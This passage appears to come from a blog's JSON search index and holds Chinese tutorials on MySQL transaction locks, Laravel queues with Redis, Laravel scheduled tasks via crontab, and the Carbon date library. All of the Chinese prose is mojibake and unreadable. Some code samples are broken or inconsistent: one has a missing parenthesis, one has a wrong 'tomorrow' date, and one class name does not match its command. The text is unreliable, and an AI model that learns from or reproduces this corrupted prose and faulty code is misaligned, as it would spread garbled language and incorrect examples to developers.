çš„é”ï¼ˆè¿™ç¯‡ç¬”è®°å°±ä¸å¯¹é”çš„åˆ†ç±»å…·ä½“å±•å¼€è¯´æ˜äº†ï¼‰ï¼Œå¾€å¾€éƒ½æ˜¯ä¼´éšäº‹åŠ¡å‡ºç°ã€‚ ä¸ºäº†æ¼”ç¤ºã€é”ã€æ˜¯å¦‚ä½•äº§ç”Ÿçš„ï¼Œè¿™æ¬¡éœ€è¦åŒæ—¶ç”¨åˆ°ä¸Šé¢çš„ä¸¤ä¸ªç¤ºä¾‹ã€‚ é¦–å…ˆè¯·æ±‚127.0.0.1:8000/sleep15ï¼Œåœ¨è¯·æ±‚ç»“æŸä¹‹å‰ï¼Œè¯·æ±‚127.0.0.1:8000/test ã€‚ æ­¤æ—¶è§‚å¯Ÿè¯·æ±‚çŠ¶æ€ï¼Œå¯ä»¥å‘ç°ä¸¤ä¸ªæ¥å£éƒ½æ²¡æœ‰é©¬ä¸Šå“åº”ã€‚ å†æ¬¡æ‰“å¼€Mysql å®¢æˆ·ç«¯ï¼ŒæŸ¥çœ‹å½“å‰æ­£åœ¨è¿›è¡Œä¸­çš„äº‹åŠ¡ï¼š ä¸å‡ºæ„å¤–ï¼Œå¯ä»¥å‘ç°æ­¤æ—¶ç­‰å¾…çš„äº‹åŠ¡å˜æˆäº†ä¸¤ä¸ªã€‚ é€šè¿‡trx_id å¤§å°ï¼Œå¯ä»¥åˆ¤æ–­å‡ºï¼Œå…ˆè¯·æ±‚çš„127.0.0.1:8000/sleep15 äº‹åŠ¡å½“å‰æ­£åœ¨è¿è¡Œä¸­ï¼Œè€Œåé¢è¯·æ±‚çš„127.0.0.1:8000/test äº‹åŠ¡ï¼Œåˆ™æ˜¯è¢«é”ä½ç­‰å¾…ï¼Œç­‰å¾…å‰é¢çš„äº‹åŠ¡é‡Šæ”¾ï¼ˆæäº¤æˆ–è€…å›æ»šï¼‰ã€‚ åŒç†ï¼Œå¦‚æœæ­¤æ—¶è¯·æ±‚ä¸æ˜¯ä¸¤ä¸ªï¼Œè€Œæ˜¯å¤šä¸ªï¼Œç›¸åº”çš„ï¼Œè¢«é”ä½çš„äº‹åŠ¡å°±æ˜¯å¤šä¸ªã€‚ ç»“è¯­è¿™ä¸ªé—®é¢˜çœ‹ç€æŒºç®€å•çš„ï¼Œä½†å®é™…å¼€å‘æ—¶ï¼Œå¾€å¾€å®¹æ˜“è¢«å¿½ç•¥ã€‚ è¿‡æ—©å¼€å¯äº‹åŠ¡ï¼Œæäº¤æˆ–è€…å›æ»šäº‹åŠ¡ä¹‹å‰ï¼Œç©¿æ’è®¸å¤šå…¶ä»–ä¸šåŠ¡é€»è¾‘ï¼Œå¦‚æœå…¶ä»–æŸä¸ªé€»è¾‘è¶…æ—¶ï¼Œåˆ™ä¼šå¯¼è‡´äº‹åŠ¡ä¸èƒ½åŠæ—¶é‡Šæ”¾ï¼Œä»è€Œå‡ºç°è¿é”ååº”ã€‚","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"Laravel Queue å¿…çŸ¥å¿…ä¼š","slug":"laravel-queue-must-know-and-know","date":"2021-07-17T14:36:23.000Z","updated":"2021-07-17T14:37:55.058Z","comments":true,"path":"laravel-queue-must-know-and-know/","link":"","permalink":"https://www.0x2beace.com/laravel-queue-must-know-and-know/","excerpt":"è¿™ç¯‡ç¬”è®°è½¬è½½äºâ€”â€”ä½¿ç”¨ Laravel Queue ä¸å¾—ä¸æ˜ç™½çš„çŸ¥è¯†ã€‚","text":"è¿™ç¯‡ç¬”è®°è½¬è½½äºâ€”â€”ä½¿ç”¨ Laravel Queue ä¸å¾—ä¸æ˜ç™½çš„çŸ¥è¯†ã€‚ æˆ‘è§‰å¾—è¿™ç¯‡æ–‡ç« å°±å±äºå°±é‚£ç§å†™å¾—æ¯”è¾ƒå¥½çš„æ–‡ç« ï¼ŒåŸå› å¦‚ä¸‹ï¼š æˆäººé±¼ä¸å¦‚æˆäººä»¥æ¸”ã€‚ä¸€èˆ¬çš„æ–‡ç« é€šå¸¸åªæ˜¯æ•™ä½ å¦‚ä½•ä½¿ç”¨ï¼Œç”¨å®Œä¹‹åï¼Œä½ å®šæ˜¯çŸ¥å…¶ç„¶ä¸çŸ¥å…¶æ‰€ä»¥ç„¶ã€‚è€Œè¿™ç¯‡æ–‡ç« åˆ™æ˜¯ä»â€œåº•å±‚åŸç†â€çš„è§’åº¦ï¼Œå»äº†è§£Laravel Queueã€‚ å‘½ä»¤è¯¦è§£ä½¿ç”¨è¿‡Laravel Queue çš„ä½ ï¼Œä¸€å®šä¹Ÿä¼šå¯¹è¿™ä¸ªå‘½ä»¤æ„Ÿåˆ°å¾ˆç†Ÿæ‚‰ï¼Œé€šå¸¸æˆ‘ä»¬éœ€è¦å¯¹æŸä¸ªé˜Ÿåˆ—è¿›è¡Œæ¶ˆè´¹æ—¶ï¼Œä¼šæ‰§è¡Œè¿™ä¸ªå‘½ä»¤ã€‚ 1php artisan queue:work --daemon --quiet --queue=default --delay=3 --sleep=3 --tries=3 è¿™ä¸ªå‘½ä»¤æœ‰å¾ˆå¤šå‚æ•°ï¼Œä¸€èµ·æ¥çœ‹çœ‹å§ï¼š --daemonï¼šä»¥å®ˆæŠ¤è¿›ç¨‹çš„æ–¹å¼è¿è¡Œé˜Ÿåˆ—ï¼Œé€šå¸¸ä¼šåœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨åˆ°ã€‚ --quietï¼šä¸è¾“å‡ºä»»ä½•å†…å®¹ --delay=3ï¼šä¸€ä¸ªä»»åŠ¡å¤±è´¥åï¼Œå»¶è¿Ÿå¤šé•¿æ—¶é—´åå†é‡è¯•ï¼ˆå•ä½æ˜¯ç§’ï¼‰ --sleep=3ï¼šå»é˜Ÿåˆ—ä¸­æ¶ˆè´¹æ—¶ï¼Œå¦‚æœå‘ç°æ²¡æœ‰ä»»åŠ¡ï¼Œä¼‘æ¯å¤šé•¿æ—¶é—´ï¼ˆå•ä½æ˜¯ç§’ï¼‰ --tries=3ï¼šå®šä¹‰å¤±è´¥ä»»åŠ¡æœ€å¤šé‡è¯•æ¬¡æ•° å½“æˆ‘ä»¬ dispatch ä¸€ä¸ªJob ä¹‹åï¼Œå€’åº•å‘ç”Ÿäº†å“ªäº›äº‹æƒ…è¿™é‡Œä¸ºäº†æ–¹ä¾¿è°ƒè¯•åŠç†è§£ï¼Œéœ€è¦å…ˆå°† Queue driver è®¾ç½®ä¸ºredisã€‚ 1QUEUE_CONNECTION=redis é¦–å…ˆå¾—åˆ›å»ºä¸€ä¸ªJobï¼š 1php artisan make:job ExampleJob è¿›å…¥redis-cliï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 12127.0.0.1:6379&gt; monitorOK ç„¶åæ‰“å¼€Tinkerï¼Œåˆ†é…ä¸€ä¸ªä»»åŠ¡ï¼š 1dispatch(new \\App\\Jobs\\ExampleJob()); å†æ¬¡è§‚å¯Ÿredis-cli æ§åˆ¶å°ã€‚ 12341626490482.711473 [0 127.0.0.1:64056] \"SELECT\" \"0\"1626490482.719953 [0 127.0.0.1:64056] \"EVAL\" \"-- Push the job onto the queue...\\nredis.call('rpush', KEYS[1], ARGV[1])\\n-- Push a notification onto the \\\"notify\\\" queue...\\nredis.call('rpush', KEYS[2], 1)\" \"2\" \"queues:default\" \"queues:default:notify\" \"&#123;\\\"uuid\\\":\\\"d945da70-8c68-47d7-86c6-f631a4da6296\\\",\\\"displayName\\\":\\\"App\\\\\\\\Jobs\\\\\\\\ExampleJob\\\",\\\"job\\\":\\\"Illuminate\\\\\\\\Queue\\\\\\\\CallQueuedHandler@call\\\",\\\"maxTries\\\":null,\\\"maxExceptions\\\":null,\\\"failOnTimeout\\\":false,\\\"backoff\\\":null,\\\"timeout\\\":null,\\\"retryUntil\\\":null,\\\"data\\\":&#123;\\\"commandName\\\":\\\"App\\\\\\\\Jobs\\\\\\\\ExampleJob\\\",\\\"command\\\":\\\"O:19:\\\\\\\"App\\\\\\\\Jobs\\\\\\\\ExampleJob\\\\\\\":10:&#123;s:3:\\\\\\\"job\\\\\\\";N;s:10:\\\\\\\"connection\\\\\\\";N;s:5:\\\\\\\"queue\\\\\\\";N;s:15:\\\\\\\"chainConnection\\\\\\\";N;s:10:\\\\\\\"chainQueue\\\\\\\";N;s:19:\\\\\\\"chainCatchCallbacks\\\\\\\";N;s:5:\\\\\\\"delay\\\\\\\";N;s:11:\\\\\\\"afterCommit\\\\\\\";N;s:10:\\\\\\\"middleware\\\\\\\";a:0:&#123;&#125;s:7:\\\\\\\"chained\\\\\\\";a:0:&#123;&#125;&#125;\\\"&#125;,\\\"id\\\":\\\"OjbqA9m9x7VsdzNds6JXImwYI86j0E9H\\\",\\\"attempts\\\":0&#125;\"1626490482.725191 [0 lua] \"rpush\" \"queues:default\" \"&#123;\\\"uuid\\\":\\\"d945da70-8c68-47d7-86c6-f631a4da6296\\\",\\\"displayName\\\":\\\"App\\\\\\\\Jobs\\\\\\\\ExampleJob\\\",\\\"job\\\":\\\"Illuminate\\\\\\\\Queue\\\\\\\\CallQueuedHandler@call\\\",\\\"maxTries\\\":null,\\\"maxExceptions\\\":null,\\\"failOnTimeout\\\":false,\\\"backoff\\\":null,\\\"timeout\\\":null,\\\"retryUntil\\\":null,\\\"data\\\":&#123;\\\"commandName\\\":\\\"App\\\\\\\\Jobs\\\\\\\\ExampleJob\\\",\\\"command\\\":\\\"O:19:\\\\\\\"App\\\\\\\\Jobs\\\\\\\\ExampleJob\\\\\\\":10:&#123;s:3:\\\\\\\"job\\\\\\\";N;s:10:\\\\\\\"connection\\\\\\\";N;s:5:\\\\\\\"queue\\\\\\\";N;s:15:\\\\\\\"chainConnection\\\\\\\";N;s:10:\\\\\\\"chainQueue\\\\\\\";N;s:19:\\\\\\\"chainCatchCallbacks\\\\\\\";N;s:5:\\\\\\\"delay\\\\\\\";N;s:11:\\\\\\\"afterCommit\\\\\\\";N;s:10:\\\\\\\"middleware\\\\\\\";a:0:&#123;&#125;s:7:\\\\\\\"chained\\\\\\\";a:0:&#123;&#125;&#125;\\\"&#125;,\\\"id\\\":\\\"OjbqA9m9x7VsdzNds6JXImwYI86j0E9H\\\",\\\"attempts\\\":0&#125;\"1626490482.726123 [0 lua] \"rpush\" \"queues:default:notify\" \"1\" æ­£å¸¸å¯ä»¥çœ‹åˆ°ä»¥ä¸Šè¾“å‡ºï¼Œè¯´æ˜æˆ‘ä»¬çš„Job å·²ç»æˆåŠŸæ”¾å…¥é˜Ÿåˆ—ä¸­äº†ã€‚ 123127.0.0.1:6379&gt; keys queue*1) \"queues:default\"2) \"queues:default:notify\" æ­¤æ—¶ï¼Œå¦‚æœæ‰§è¡Œphp artisan workï¼Œåˆ™å¼€å§‹ä¼šæ¶ˆè´¹é˜Ÿåˆ—ï¼š 123php artisan queue:work --queue=default [2021-07-17 11:36:46][hpDVkINqhtLCi9jKqQKveC6utwX3C8jS] Processing: App\\Jobs\\ExampleJob[2021-07-17 11:36:46][hpDVkINqhtLCi9jKqQKveC6utwX3C8jS] Processed: App\\Jobs\\ExampleJob é€šè¿‡åˆ†æä¸Šé¢çš„è¾“å‡ºï¼Œå¯ä»¥çŸ¥é“é˜Ÿåˆ—åœ¨Redis çš„æ¶ˆè´¹è¿‡ç¨‹åº”è¯¥æ˜¯ï¼š 12345678910// é¦–å…ˆä» queue:default List ä¸­å–å‡ºä»»åŠ¡\"lpop\" \"queues:default\"// æš‚å­˜åˆ°queues:default:reserved Zset ä¸­\"zadd\" \"queues:default:reserved\" \"1626493456\" // ä»»åŠ¡æ‰§è¡Œå®Œæ¯•åï¼Œ ä» queues:default:reserved Zset ä¸­åˆ é™¤\"zrem\" \"queues:default:reserved\"// å¦‚æœä»»åŠ¡å¤±è´¥ï¼Œä¼šæ”¾åˆ° queue:default:delay zset ä¸­ è½¬è½½æ–‡ç« æ˜¯ä½œè€…åœ¨Laravel 5.x ç‰ˆæœ¬æ—¶å†™çš„ï¼Œæ—¶è‡³å¦‚ä»Šï¼ŒLaravel å·²å‘å¸ƒè‡³8.x ï¼Œé˜Ÿåˆ—æ¶ˆè´¹çš„ç»†èŠ‚å¯èƒ½å‘ç”Ÿäº†ä¸€äº›å˜åŒ–ï¼Œä½†æ˜¯æ ¸å¿ƒçš„é€»è¾‘è¿˜æ˜¯æ²¡å˜ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"},{"name":"MQ","slug":"PHP/Laravel/MQ","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/MQ/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"MQ","slug":"MQ","permalink":"https://www.0x2beace.com/tags/MQ/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Laravel å¦‚ä½•æ‰§è¡Œå®šæ—¶ä»»åŠ¡","slug":"how-does-laravel-perform-timing-tasks","date":"2021-07-04T14:37:03.000Z","updated":"2021-07-04T14:37:42.146Z","comments":true,"path":"how-does-laravel-perform-timing-tasks/","link":"","permalink":"https://www.0x2beace.com/how-does-laravel-perform-timing-tasks/","excerpt":"Laravel å¦‚ä½•æ‰§è¡Œå®šä¹‰ä»»åŠ¡ï¼Ÿæˆ–è€…è¯´å¦‚ä½•è®¾è®¡å®šä¹‰ä»»åŠ¡çš„æ‰§è¡Œï¼Ÿ","text":"Laravel å¦‚ä½•æ‰§è¡Œå®šä¹‰ä»»åŠ¡ï¼Ÿæˆ–è€…è¯´å¦‚ä½•è®¾è®¡å®šä¹‰ä»»åŠ¡çš„æ‰§è¡Œï¼Ÿ ç¬¬ä¸€ä¸ªæƒ³åˆ°çš„è‚¯å®šæ˜¯è®¾ç½® crontab å®šæ—¶ä»»åŠ¡ï¼Œä½†æ˜¯ crontab æ‰€åšçš„äº‹æƒ…é€šå¸¸æ˜¯ï¼Œæ¯éš”ä¸€ä¸ªæ—¶é—´æ®µæ‰§è¡Œä¸€æ¬¡æŸä¸ªå‘½ä»¤ã€‚ å‡è®¾æˆ‘ä»¬ç°åœ¨çš„éœ€æ±‚æ˜¯ï¼Œæ¯å¤©æ™šä¸Šçš„åäºŒç‚¹ï¼Œå»æ¸…ç†ä¸€æ¬¡æ•°æ®åº“ã€‚ é‚£ä¹ˆå¦‚ä½•å°†è¿™ä»¶äº‹æƒ…ä¸ crontab çš„å®šæ—¶ä»»åŠ¡å…³è”èµ·æ¥å‘¢ï¼Ÿéš¾é“è¦å†™ä¸€ä¸ªPHP è„šæœ¬ï¼Œäº¤ç»™ crontab æ¯å¤©å‡Œæ™¨æ‰§è¡Œä¸€æ¬¡ï¼Ÿ è¿™å½“ç„¶æ˜¯ä¸€ä¸ªåŠæ³•ï¼Œä½†æ˜¯åœ¨Laravel ä¸­æœ‰æ›´å¥½çš„æ–¹æ¡ˆâ€”â€”ä»»åŠ¡è°ƒåº¦ã€‚ æ–°å»ºArtisan å‘½ä»¤ä½¿ç”¨ä»¥ä¸‹ç”Ÿæˆå‘½ä»¤ç±»ï¼š 1$ php artisan make:command DataCleaning --command=system:data-cleaning åœ¨handle ä¸­ï¼Œç¼–å†™ã€æ•°æ®æ¸…ç†ã€çš„é€»è¾‘ã€‚ 1234567891011121314151617181920&lt;?phpnamespace App\\Console\\Commands;use Illuminate\\Console\\Command;class CalculateActiveUser extends Command&#123; // ä¾›æˆ‘ä»¬è°ƒç”¨å‘½ä»¤ protected $signature = 'larabbs:calculate-active-user'; // å‘½ä»¤çš„æè¿° protected $description = 'ç”Ÿæˆæ´»è·ƒç”¨æˆ·'; // æœ€ç»ˆæ‰§è¡Œçš„æ–¹æ³• public function handle() &#123; // æ•°æ®æ¸…ç† &#125;&#125; å®šæ—¶ä»»åŠ¡Laravel å‘½ä»¤è°ƒåº¦å™¨å…è®¸æˆ‘ä»¬åœ¨ Laravel ä¸­å¯¹å‘½ä»¤è°ƒåº¦è¿›è¡Œæ¸…æ™°æµç•…çš„å®šä¹‰ï¼Œå¹¶ä¸”ä»…éœ€è¦åœ¨æœåŠ¡å™¨ä¸Šå¢åŠ ä¸€æ¡ crontab ä»»åŠ¡å³å¯ã€‚ è°ƒåº¦åœ¨ app/Console/Kernel.php æ–‡ä»¶çš„ schedule æ–¹æ³•ä¸­å®šä¹‰ã€‚ è®¾ç½®ç³»ç»Ÿå®šæ—¶ä»»åŠ¡ï¼š 123crontab -e// å¡«å…¥ä»¥ä¸‹å†…å®¹* * * * * php /your_project_absolute_path schedule:run &gt;&gt; /dev/null 2&gt;&amp;1 è¿™é‡Œä¸ºäº†æµ‹è¯•å®šæ—¶ä»»åŠ¡çš„æ‰§è¡Œï¼Œå…ˆè®¾ç½®æ¯åˆ†é’Ÿè¿›è¡Œè§‚å¯Ÿã€‚ /dev/null 2&gt;&amp;1 åˆ†ä¸ºä¸¤éƒ¨åˆ†è¿›è¡Œç†è§£ï¼š /dev/nullæ˜¯ç³»ç»Ÿé»‘æ´ï¼Œä¹Ÿå°±æ˜¯ &gt;&gt; ä¹‹å‰æ‰§è¡Œçš„è¾“å‡ºä¿¡æ¯ä¼šå…¨éƒ¨ä¸¢è¿›è¿™ä¸ªé»‘æ´ä¸­ åœ¨æ ‡å‡†è¾“å‡ºä¸­ï¼Œstdin æ˜¯ 0ï¼Œstdout æ˜¯ 1ï¼Œstderr æ˜¯ 2ï¼Œæ‰€ä»¥å®ƒå°† stderr å…¨éƒ¨å¯¼åˆ° stdoutï¼Œstdoutåˆè¢«å¯¼å› /dev/nullï¼Œä¹Ÿå°±æ˜¯ä¸è¾“å‡º æ‰€ä»¥ï¼Œè¿™ä¸¤æ®µåŠ èµ·æ¥çš„ç»“æœå°±æ˜¯ crontab çš„æ‰§è¡Œä¸ä¼šæœ‰ä»»ä½•è¾“å‡ºã€‚ ä½†è°ƒè¯•é˜¶æ®µï¼Œè¿˜æ˜¯å»ºè®®å…ˆè¾“å‡ºåˆ°ä¸€ä¸ªå·²çŸ¥æ–‡ä»¶ï¼Œè¿™æ ·å¥½ç¡®å®šå®šæ—¶ä»»åŠ¡æ˜¯å¦æœ‰æ­£å¸¸æ‰§è¡Œï¼ˆå¦‚æœä»»åŠ¡æ‰§è¡Œå¼‚å¸¸ï¼Œä¼šçœ‹åˆ°å¼‚å¸¸ä¿¡æ¯ï¼‰ã€‚ 1* * * * * php /your_project_absolute_path schedule:run &gt;&gt; /tmp/crontab.log ç³»ç»Ÿçš„å®šæ—¶ä»»åŠ¡å·²ç»è®¾å®šå¥½äº†ï¼Œç°åœ¨ crontab å°†ä¼šæ¯åˆ†é’Ÿè°ƒç”¨ä¸€æ¬¡ Laravel å‘½ä»¤è°ƒåº¦å™¨ï¼Œå½“ schedule:run å‘½ä»¤æ‰§è¡Œæ—¶ï¼Œ Laravel ä¼šè¯„ä¼°ä½ çš„è®¡åˆ’ä»»åŠ¡å¹¶è¿è¡Œé¢„å®šä»»åŠ¡ã€‚ ä»»åŠ¡è°ƒåº¦æœ€åæˆ‘ä»¬æ³¨å†ŒLaravel è°ƒåº¦ä»»åŠ¡å³å¯ï¼š 12345678910111213// app/Console/Kernel.php&lt;?phpclass Kernel extends ConsoleKernel&#123; protected function schedule(Schedule $schedule) &#123; // æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ã€æ•°æ®æ¸…ç†ã€ï¼ˆè¿›è¡Œè°ƒè¯•ï¼‰ $schedule-&gt;command('system:data-cleaning')-&gt;everyMinute(); // daily æ¯å¤©æ‰§è¡Œä¸€æ¬¡ã€æ•°æ®æ¸…ç†ã€ &#125;&#125; è°ƒè¯•æ—¶ï¼Œä»ä½¿ç”¨ä¸€åˆ†é’Ÿï¼Œå¦‚æœè¿è¡Œæ­£å¸¸ï¼Œä¹‹åå°†everyMinute æ›¿æ¢æˆ daily å³å¯ã€‚ åšå®Œä»¥ä¸Šæ“ä½œä¹‹åï¼Œåªéœ€è¦ç­‰å¾…ä¸€åˆ†é’Ÿï¼Œç„¶åæŸ¥çœ‹ /tmp/crontab.log æ—¥å¿—æ–‡ä»¶ï¼Œæ˜¯å¦æœ‰è¾“å‡ºï¼Œå¦‚æœèƒ½çœ‹åˆ°ä»¥ä¸‹è¾“å‡ºï¼Œåˆ™è¡¨ç¤ºä»»åŠ¡è°ƒåº¦æ­£å¸¸ã€‚ 1[2021-07-04T20:30:01+08:00] Running scheduled command: &#39;&#x2F;usr&#x2F;local&#x2F;Cellar&#x2F;php@7.4&#x2F;7.4.20&#x2F;bin&#x2F;php&#39; &#39;artisan&#39; system:data-cleaning &gt; &#39;&#x2F;dev&#x2F;null&#39; 2&gt;&amp;1 Laravel çš„ä»»åŠ¡è°ƒåº¦ï¼Œä½¿å¾—æ‰§è¡Œå®šæ—¶ä»»åŠ¡å˜å¾—éå¸¸æ–¹ä¾¿ã€‚","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"},{"name":"Laravel","slug":"PHP/Laravel","permalink":"https://www.0x2beace.com/categories/PHP/Laravel/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Laravel","slug":"Laravel","permalink":"https://www.0x2beace.com/tags/Laravel/"}]},{"title":"Laravel Carbon å¿«é€Ÿä¸Šæ‰‹","slug":"laravel-carbon-quick-start","date":"2021-07-03T12:40:45.000Z","updated":"2023-02-18T03:28:33.604Z","comments":true,"path":"laravel-carbon-quick-start/","link":"","permalink":"https://www.0x2beace.com/laravel-carbon-quick-start/","excerpt":"åœ¨ä½¿ç”¨PHP å¼€å‘æ—¶ï¼Œå…ä¸äº†ç»å¸¸éœ€è¦å¤„ç†æ—¥æœŸå’Œæ—¶é—´ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬ä¸å¾—ä¸é¢ä¸´å„ç§æ ¼å¼åŒ–ã€æ—¥æœŸ/æ—¶é—´è®¡ç®—ç­‰é—®é¢˜ã€‚ å¹¸è¿çš„æ˜¯ï¼Œä¸€äº›å‹¤åŠ³çš„äººå·²ç»å¸®æˆ‘ä»¬å®Œæˆäº†è¾›è‹¦çš„å·¥ä½œï¼Œä½¿å¾—åœ¨PHP å¼€å‘ä¸­å¤„ç†æ—¥æœŸ/æ—¶é—´å˜å¾—æ›´åŠ ç®€å•ã€æ›´è¯­ä¹‰åŒ–ã€‚","text":"åœ¨ä½¿ç”¨PHP å¼€å‘æ—¶ï¼Œå…ä¸äº†ç»å¸¸éœ€è¦å¤„ç†æ—¥æœŸå’Œæ—¶é—´ï¼Œè¿™ä½¿å¾—æˆ‘ä»¬ä¸å¾—ä¸é¢ä¸´å„ç§æ ¼å¼åŒ–ã€æ—¥æœŸ/æ—¶é—´è®¡ç®—ç­‰é—®é¢˜ã€‚ å¹¸è¿çš„æ˜¯ï¼Œä¸€äº›å‹¤åŠ³çš„äººå·²ç»å¸®æˆ‘ä»¬å®Œæˆäº†è¾›è‹¦çš„å·¥ä½œï¼Œä½¿å¾—åœ¨PHP å¼€å‘ä¸­å¤„ç†æ—¥æœŸ/æ—¶é—´å˜å¾—æ›´åŠ ç®€å•ã€æ›´è¯­ä¹‰åŒ–ã€‚ CarbonCarbon æ˜¯ç”± Brian Nesbit å¼€å‘çš„ä¸€ä¸ªåŒ…ï¼Œå®ƒæ‰©å±•äº† PHP è‡ªå·±çš„ DateTime ç±»ã€‚ å®ƒæä¾›äº†ä¸€äº›å¾ˆå¥½çš„åŠŸèƒ½æ¥å¤„ç† PHP ä¸­çš„æ—¥æœŸ/æ—¶é—´ï¼Œè¯¸å¦‚ï¼š å¤„ç†æ—¶åŒº æ—¥æœŸè§£æ æ—¥æœŸæ“ä½œ æ—¥æœŸæ¯”è¾ƒ æ—¥æœŸè¯­ä¹‰åŒ– æ—¥æœŸæ ¼å¼åŒ– ç­‰ å®‰è£…ï¼š 1composer require nesbot/carbon ä½¿ç”¨ï¼š 123456&lt;?phprequire __DIR__ . '/vendor/autoload.php';use Carbon\\Carbon;echo Carbon::now(); // 2021-07-03 16:02:17 æ³¨æ„ï¼šå› ä¸ºLaravel å·²é»˜è®¤å®‰è£…äº†æ­¤åŒ…ï¼Œæ‰€ä»¥æ— éœ€å†æ¬¡æ‰§è¡Œä¸Šé¢çš„å‘½ä»¤ã€‚ è·å–ç‰¹å®šæ—¥æœŸ/æ—¶é—´123456789101112131415161718// è·å–å½“å‰æ—¶é—´ - 2021-07-03 16:03:46echo Carbon::now(); // Objectecho new Carbon();// è·å–ä»Šå¤© - 2021-07-03 00:00:00echo Carbon::today();// è·å–æ˜¨å¤© - 2021-07-02 00:00:00echo Carbon::yesterday();// è·å–æ˜å¤© - 2021-12-04 00:00:00echo Carbon::tomorrow();// è§£æç‰¹å®šå­—ç¬¦ä¸² - 2021-01-01 00:00:00echo new Carbon('first day of January 2021');// è®¾å®šä¸€ä¸ªç‰¹å®šçš„æ—¶åŒº - 2021-01-01 00:00:00echo new Carbon('first day of January 2021', 'Asia/Tokyo'); é»˜è®¤æƒ…å†µä¸‹ï¼ŒCarbon çš„æ–¹æ³•è¿”å›çš„ä¸ºä¸€ä¸ªæ—¥æœŸæ—¶é—´å¯¹è±¡ã€‚ 12345Carbon &#123;#179 â–¼ +\"date\": \"2021-07-03 00:00:00.000000\" +\"timezone_type\": 3 +\"timezone\": \"UTC\"&#125; è™½ç„¶å®ƒæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œä½†æ˜¯å´å¯ä»¥ç›´æ¥ä½¿ç”¨ echo è¾“å‡ºç»“æœï¼Œå› ä¸ºæœ‰ __toStringé­”æœ¯æ–¹æ³•ã€‚ æ—¥æœŸæ ¼å¼åŒ–å¦‚æœä½ æƒ³æŠŠå®ƒè½¬ä¸ºå­—ç¬¦ä¸²ï¼Œå¯ä»¥ä½¿ç”¨ toDateString æˆ– toDateTimeStringç­‰æ–¹æ³•ï¼š 12345678$dt = Carbon::now();echo $dt-&gt;toDateString(); // 2021-07-03echo $dt-&gt;toFormattedDateString(); // Jul 3, 2021echo $dt-&gt;toTimeString(); // 16:40:01echo $dt-&gt;toDateTimeString(); // 2021-07-03 16:40:01echo $dt-&gt;toDayDateTimeString(); // Sat, Jul 3, 2021 4:40 PMecho $dt-&gt;format('Y.m.d'); // 2021.07.03 æ—¥æœŸè§£æå¯ä»¥ä½¿ç”¨ parse æ–¹æ³•è§£æä»»ä½•é¡ºåºå’Œç±»å‹çš„æ—¥æœŸã€‚ 12345678910111213echo Carbon::parse(\"2021-07-03 16:20:44\");echo Carbon::parse(\"2021-07-03 16:20:44\")-&gt;toDateString();echo Carbon::parse(\"2021-07-03 16:20:44\")-&gt;toDateTimeString();echo Carbon::parse('now'); // 2021-07-03 16:24:01echo Carbon::parse('today'); // 2021-07-03 00:00:00echo Carbon::parse('yesterday'); // 2021-07-02 00:00:00echo Carbon::parse('tomorrow'); // 2021-07-04 00:00:00echo Carbon::parse('2 days ago'); // 2021-07-01 16:25:55 echo Carbon::parse('+3 days'); // 2021-07-06 16:25:55echo Carbon::parse('+3 weeks'); // 2021-07-24 16:25:55echo Carbon::parse('+1 months'); // 2021-08-03 16:25:55 è¿”å›ç»“æœä»æ˜¯ Carbon ç±»å‹çš„æ—¥æœŸæ—¶é—´å¯¹è±¡ã€‚ æ—¥æœŸ/æ—¶é—´æ“ä½œå¦‚ä½•è·å–æ—¥æœŸï¼Œå¹¶ä¸æ˜¯å”¯ä¸€éœ€è¦åšçš„äº‹æƒ…ï¼Œç»å¸¸éœ€è¦åšçš„äº‹æƒ…åº”è¯¥æ˜¯æ“ä½œæ—¥æœŸæˆ–æ—¶é—´ã€‚ ä¾‹å¦‚ï¼šè®¡ç®—ä¸€ä¸ªæ—¥æœŸåŠ ä¸ŠN å¤©ä¹‹åï¼Œæ˜¯ä»€ä¹ˆæ—¶é—´; ä¸¤ä¸ªæœˆåçš„ä»Šå¤©æ˜¯ä»€ä¹ˆæ—¶é—´; å½“å‰æ—¶é—´çš„ä¸‰ä¸ªå°æ—¶ä¹‹åæ˜¯ä»€ä¹ˆæ—¶é—´; è¯¸å¦‚æ­¤ç±»ã€‚ 1234567echo Carbon::now()-&gt;addDays(25); // 2021-07-28 16:31:03echo Carbon::now()-&gt;addWeeks(3); // 2021-07-24 16:31:03echo Carbon::now()-&gt;addHours(25); // 2021-07-04 17:31:03echo Carbon::now()-&gt;subHours(2); // 2021-07-03 14:31:03 echo Carbon::now()-&gt;addHours(2)-&gt;addMinutes(12; // 2021-07-03 18:43:03echo Carbon::now()-&gt;modify('+15 days'); // 2021-07-18 16:31:03echo Carbon::now()-&gt;modify('-2 days'); // 2021-07-01 16:31:03 æ—¥æœŸæ¯”è¾ƒåœ¨ Carbon ä¸­ä½ å¯ä»¥ä½¿ç”¨ä¸‹é¢çš„æ–¹æ³•æ¥æ¯”è¾ƒæ—¥æœŸï¼š min â€“è¿”å›æœ€å°æ—¥æœŸã€‚ max â€“ è¿”å›æœ€å¤§æ—¥æœŸã€‚ eq â€“ åˆ¤æ–­ä¸¤ä¸ªæ—¥æœŸæ˜¯å¦ç›¸ç­‰ã€‚ gt â€“ åˆ¤æ–­ç¬¬ä¸€ä¸ªæ—¥æœŸæ˜¯å¦æ¯”ç¬¬äºŒä¸ªæ—¥æœŸå¤§ã€‚ lt â€“ 